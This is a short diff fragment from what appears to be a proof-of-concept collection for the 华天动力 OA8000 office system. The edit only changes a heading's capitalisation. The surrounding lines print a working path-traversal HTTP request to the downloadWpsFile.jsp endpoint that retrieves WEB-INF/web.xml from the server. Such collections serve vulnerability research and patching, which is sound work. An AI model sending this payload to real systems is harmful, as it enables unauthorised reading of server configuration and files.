@@ -9,7 +9,7 @@ app="华天动力-OA8000"
 ```
 
 
-## poc
+## POC
 
 ```yaml
 GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/2
